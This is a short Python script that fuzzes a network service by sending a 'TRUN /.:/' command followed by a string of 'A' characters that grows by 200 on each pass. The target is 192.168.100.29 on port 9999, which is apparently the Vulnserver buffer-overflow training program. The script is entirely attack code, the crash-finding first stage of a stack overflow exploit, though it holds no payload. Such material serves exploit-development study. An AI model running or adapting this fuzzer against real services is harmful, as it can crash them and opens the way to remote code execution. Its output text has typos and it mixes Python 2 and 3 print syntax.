#!/usr/bin/python

import socket, sys
from time import sleep

buffer = "A" * 200

while True:
	try:
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(2)
		s.connect(('192.168.100.29',9999))
		s.recv(1024)

		print '[*] Senf buffer Lenght: ' + str(len(buffer))
		s.send("TRUN /.:/ " + buffer)
		s.close()
		sleep(1)
		buffer=buffer+'A'* 200

	except Exception as e:
		print(str(e))
		sys.exit()
